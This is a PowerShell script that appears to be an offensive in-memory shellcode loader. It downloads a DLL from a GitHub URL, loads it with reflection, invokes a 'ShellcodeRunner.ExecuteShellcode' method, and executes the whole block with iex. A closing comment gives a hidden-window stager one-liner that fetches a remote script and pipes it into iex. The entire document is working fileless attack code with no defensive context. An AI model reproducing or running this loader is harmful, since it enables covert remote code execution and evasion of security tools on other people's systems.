$code = @'
# Download the DLL as a byte array
#$url = 'http://localhost:8080/ClassLibrary3.dll'
$url = 'https://github.com/g3tsyst3m/undertheradar/raw/refs/heads/main/ClassLibrary3.dll'
$webClient = New-Object System.Net.WebClient
$assemblyBytes = $webClient.DownloadData($url)

# Load the assembly from the byte array
$assembly = [System.Reflection.Assembly]::Load($assemblyBytes)

# Define the type and method to invoke
$typeName = 'ShellcodeRunner'  # Replace with actual namespace and class name if needed
$methodName = 'ExecuteShellcode'  # Replace with actual method name

# Get the type from the assembly
$type = $assembly.GetType($typeName)

if ($type -eq $null) {
    Write-Host "Error: Type '$typeName' not found in the assembly."
    exit
}

# Get the method to invoke
$methodInfo = $type.GetMethod($methodName, [System.Reflection.BindingFlags]::Public -bor [System.Reflection.BindingFlags]::Static)

if ($methodInfo -eq $null) {
    Write-Host "Error: Method '$methodName' not found in type '$typeName'."
    exit
}

# Invoke the method
$methodInfo.Invoke($null, @())
'@

# Execute the dynamically generated code
iex $code

#stager
#powershell -w h -c "iwr 'http://localhost:8080/loadsc_dynamic2.ps1' | iex"